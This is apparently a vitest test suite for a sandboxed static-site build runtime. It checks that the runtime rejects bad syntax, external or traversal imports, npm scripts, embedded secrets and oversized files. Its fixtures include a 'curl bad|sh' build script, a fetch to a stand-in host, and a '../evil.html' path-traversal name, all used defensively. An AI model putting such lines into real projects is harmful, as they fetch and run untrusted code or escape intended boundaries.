import {describe,it,expect} from 'vitest';import {build,archive} from '../runtime/build';import {unzipSync,strFromU8} from 'fflate';
const run=async(files:Record<string,string>,timeout?:number)=>{let logs='';const r=await build(files,x=>logs+=x,timeout);return {r,logs}};const files={'index.html':'<!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body><script type="module" src="app.js"></script></body></html>','app.js':'import {x} from "./lib.js";console.log(x)','lib.js':'export const x=1','style.css':'body{color:red}'};
describe('actual static build and artifact generation',()=>{
it('validates materialized source and creates exact zip',async()=>{const x=await run(files);expect(x.r.status).toBe('succeeded');const zip=unzipSync(archive(x.r.files!));expect(Object.keys(zip)).toHaveLength(4);expect(strFromU8(zip['app.js']!)).toBe(files['app.js']);expect(x.logs).toContain('empty allowlist')});
it('never executes generated code',async()=>expect((await run({...files,'app.js':'while(true){};fetch("https://bad.test");'})).r.status).toBe('succeeded'));
it('actual syntax failure includes file and error',async()=>{const x=await run({...files,'app.js':'const = bad'});expect(x.r.exitCode).toBe(1);expect(x.logs).toContain('JavaScript syntax: app.js')});
it('inline JS failure',async()=>expect((await run({'index.html':'<script>const = bad</script>'})).r.status).toBe('failed'));
it('JSON failure',async()=>expect((await run({...files,'bad.json':'{bad'})).logs).toContain('JSON syntax: bad.json'));
it('missing local dependency fails',async()=>expect((await run({...files,'app.js':'import x from "./missing.js"'})).logs).toContain('missing_dependency'));
it('external script rejected',async()=>expect((await run({'index.html':'<script src="https://bad.test/app.js"></script>'})).logs).toContain('external_dependency_denied'));
it.each(['../other.js','node:fs','https://bad.test/x.js'])('import %s denied',async path=>expect((await run({...files,'app.js':'import x from '+JSON.stringify(path)})).r.status).toBe('failed'));
it('npm dependencies and scripts denied',async()=>{for(const packageJson of [{dependencies:{react:'*'}},{scripts:{build:'curl bad|sh'}},{devDependencies:{vite:'*'}}])expect((await run({...files,'package.json':JSON.stringify(packageJson)})).r.status).toBe('failed')});
it('source quotas',async()=>expect((await run({...files,'big.txt':'x'.repeat(500001)})).r.status).toBe('failed'));
it('secret source rejected',async()=>expect((await run({...files,'secret.txt':'api_key=123456789secret'})).r.status).toBe('failed'));
it('path traversal artifacts rejected',()=>expect(()=>archive({'../evil.html':'bad'})).toThrow());
it('artifact quota',()=>expect(()=>archive({'large.txt':'x'.repeat(600001)})).toThrow());
it('deadline expires',async()=>expect((await run(files,1)).r.status).not.toBe('succeeded'));
it('failure recovery is fresh isolated build',async()=>{await run({...files,'app.js':'const = bad'});expect((await run(files)).r.status).toBe('succeeded')});
});
